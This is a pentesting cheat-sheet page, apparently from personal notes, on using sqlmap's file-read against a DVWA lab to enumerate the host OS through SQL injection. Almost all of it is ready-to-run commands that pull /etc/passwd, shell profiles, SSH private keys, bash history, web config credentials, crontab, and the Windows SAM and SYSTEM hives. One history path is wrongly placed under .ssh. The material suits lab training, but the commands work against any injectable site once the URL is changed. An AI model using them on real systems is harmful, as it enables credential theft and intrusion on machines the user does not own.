---
author(s):
  - Userware
tags:
  - webapp-pentesting
  - post-exploitation
  - server-side-attack
  - sql-injection
  - enumeration-and-discovery
  - privilege-escalation
  - credential-access-and-dumping
  - sqlmap
  - dvwa
---
# 03 - OS Enumeration

## 3.1 - Cross Platform

> [!IMPORTANT] Conditions
> The DB user must have **FILE** and **SELECT** privileges perform with the flags `--privileges -U CU`.
> > [!NOTE]
> > Not all files are readable unless the current user is `root@<IP>` (e.g. `root@localhost`). You'll notice that you can't fetch SSH credentials which is normal due to security reasons.

Enumerate hostname.

```
$ sqlmap "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --hostname
```

## 3.2 - Linux

### 3.2.1 - Basic Information

Enumerating user accounts

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --file-read="/etc/passwd"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --sql-query="SELECT LOAD_FILE('/etc/passwd')"
```

Enumerate user groups

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --file-read="/etc/group"
```

Local IPv4 address

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --file-read="/etc/network/interfaces"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --file-read="/etc/sysconfig/network"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --file-read="/etc/networks"
```

DNS resolve and nameserver IPs

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --file-read="/etc/resolv.conf"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --file-read="/etc/hosts"
```

Environment variables may contain **sensitive information**. You never know that sometimes the sysadmins can be lazy sometimes.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --file-read="/etc/profile"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --file-read="/etc/bash.bashrc"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --file-read="/home/<username>/.bash_profile"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --file-read="/root/.bash_profile"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --file-read="/home/<username>/.bashrc"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --file-read="/root/.bashrc"
```

Enumerate installed packages that will give you an idea of what services are installed.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --file-read="/var/log/dpkg.log"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --file-read="/var/log/yum.log"
```

Enumerate Linux kernel for potential exploits.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --file-read="/etc/lsb-release"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --file-read="/etc/os-release"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --file-read="/proc/version"
```

### 3.2.2 - Credentials

Retrieve SSH keys.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --file-read="/home/<username>/.ssh/id_rsa"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --file-read="/root/.ssh/id_rsa"
```

Retrieve database config file. You have to lookup of what web technology it's using such as, a **content management system (CMS)** like wordpress. Find the absolute path of the [[07 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x02 - Privilege Escalation/Linux/Local Privilege Escalation/Credentials/Config Files/Webapps/Living off the Land#^bc9e6e|database config file]] after enumeration phase for the web root directory.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --file-read="/var/www/html/dvwa/config.php"
```

Retrieve history commands. You can find more in the [[07 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x02 - Privilege Escalation/Linux/Local Privilege Escalation/Credentials/Config Files/Webapps/Living off the Land|privilege escalation credentials]] section.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --file-read="/home/<username>/.ssh/.bash_history"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --file-read="/root/.ssh/.bash_history"
```

### 3.2.3 - Privilege Escalation

CronJobs may contain backup files that is worth **harvesting the data**. Moreover, there is a possible attack vector to spawn a callback shell. Be on the lookout.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --file-read="/etc/crontab"
```

### 3.2.4 - Config Files

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --file-read="/etc/ssh/sshd_config"
```

### 3.2.5 - Hardware

Check uptime

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --file-read="/proc/uptime"
```

Enumerate mounted drives and network shares.

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --file-read="/etc/fstab"
```

Enumerate CPU cores

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --file-read="/proc/cpuinfo"
```

## 3.3 - Windows

### 3.3.1 - Basic Information

DNS resolve and nameserver IPs

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --file-read="C:/Windows/System32/drivers/etc/hosts"
```

### 3.3.2 - Credentials

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --file-read="C:/Windows/Repair/SAM"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --file-read="C:/Windows/Repair/SYSTEM"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --file-read="C:/Windows/System32/config/security"
           
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --file-read="C:/Windows/System32/config/system"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session>; security=low" --random-agent --file-read="C:/Windows/System32/config/sam"
```